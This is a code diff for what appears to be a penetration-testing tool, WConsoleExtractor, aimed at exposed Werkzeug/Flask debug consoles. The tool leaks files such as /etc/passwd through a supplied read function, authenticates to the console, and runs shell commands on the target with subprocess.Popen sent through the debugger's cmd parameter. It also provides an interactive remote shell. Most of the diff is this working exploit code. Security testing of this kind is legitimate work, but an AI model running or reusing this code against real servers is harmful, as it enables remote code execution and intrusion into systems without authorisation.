@@ -1,16 +1,15 @@
+import html.entities
 import requests
-from urllib.parse import urlsplit
+from urllib.parse import urlsplit, quote_plus
 import re
 import hashlib
 from itertools import chain
 from bs4 import BeautifulSoup as bs
 import json
-from rich.console import Console
-
-print = Console(style="bold green").print
-
+import html
 from prompt_toolkit import PromptSession
 from prompt_toolkit.shortcuts import clear
+from rich import print as rprint
 
 def error(message="", prefix=""):
     print(f"{prefix}[ERROR] {message}")
@@ -24,8 +23,16 @@ class WConsoleExtractor:
     modname = "flask.app"
     class_name = "Flask"
 
-    def __init__(self, target:str, leak_function, debugger_path:str="/console") -> None:
+    def __init__(self, target:str, leak_function, debugger_path:str="/console", no_colors=False):
+        """
+        Init WConsoleExtractor object
+        target: the target url
+        leak_function: a function that takes a filepath as parameter and returns its content
+        debugger_path: the werkzeug console path, default is /console
+        no_colors: disable colored output on debugger feature
+        """
         self.target = target
+        self.no_colors = no_colors
         if not callable(leak_function):
             error("Your leak function is not callable")
 
@@ -151,8 +158,8 @@ class WConsoleExtractor:
         return 0
 
     @staticmethod
-    def sanitize_output(output:str):
-        return output.replace("\\n", "\n")[2:-1]
+    def sanitize_command_output(output:str):
+        return output.replace("\\n", "\n")[2:-1].strip()
             
 
     def get(self, path:str):
@@ -178,6 +185,12 @@ class WConsoleExtractor:
     
     def print(self, message=""):
         print(message, end="")
+
+    def rprint(self, message=""):
+        if self.no_colors:
+            self.print(message)
+        else:
+            rprint(message)
     
     # Leaks
     def choose_username(self, etc_passwd:str):
@@ -357,52 +370,50 @@ class WConsoleExtractor:
         return state["auth"]
     
     def parse_html(self, content:str):
-        soup = bs(content, 'html.parser')
-        span = soup.find("span", attrs={"class":"string"})
+        soup = bs(content, "html.parser")
         traceback = soup.find("div", attrs={"class":"traceback"})
-        if span:
-            res = span.contents[0]
-            extended = span.find("span")
-            if extended:
-                res += extended.contents[0]
-            output = WConsoleExtractor.sanitize_output(res)
-        elif traceback:
-            err = traceback.find("blockquote")
-            output = err.contents[0]
+
+        if traceback:
+            if "noframe-traceback" in traceback.attrs["class"]:
+                err = traceback.find("pre")
+            else:
+                err = traceback.find("blockquote")
+            
+            if not err:
+                error("Unhandled error, please report the issue on tool's repository")
         else:
-            output = ""
+            res = content.split("\n")[1]
+            output = html.unescape(re.sub(r"<((?![<>]).)+>", "", res))
+
         return output.strip()
+    
+    def exec_console(self, code:str):
+        self.authent()
+        return self.get(f"{self.debugger_path}?__debugger__=yes&cmd={quote_plus(code)}&frm=0&s={self.token}")
 
     def exec_cmd(self, cmd:str):
         argv = cmd.split(' ')
-
-        self.authent()
-        
-        payload = f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()"
-        url = f"{self.debugger_path}?__debugger__=yes&cmd={payload}&frm=0&s={self.token}"
-        res = self.get(url)
+        res = self.exec_console(
+            f"import subprocess; subprocess.Popen({argv},stdout=subprocess.PIPE,stderr=subprocess.STDOUT).communicate()[0]"
+        )
 
         if res.status_code == 404:
             error("Error while sending command, please report the issue on tool's repository")
             return
     
         output = self.parse_html(res.text)
-        return output.strip()
+
+        return WConsoleExtractor.sanitize_command_output(output)
     
     def exec_dbg(self, code:str):
-        self.authent()
-        url = f"{self.debugger_path}?__debugger__=yes&cmd={code}&frm=0&s={self.token}"
-        res = self.get(url)
+        res = self.exec_console(code)
 
         if res.status_code == 404:
             error("Error while evaluating code, please report the issue on tool's repository")
             return
         
         output = self.parse_html(res.text)
-        if not output:
-            output = res.text.split("\n")[1]
-        
-        return output.strip()
+        return output
     
     def shell(self):
         exit_commands = ["exit", "quit", "q"]
@@ -446,5 +457,5 @@ class WConsoleExtractor:
                     output = self.exec_dbg(code)
                 except Exception as e:
                     output = str(e)
-                self.print(f"{output}\n")
+                self.rprint(f"{output}")
         info("Debugger Terminated")
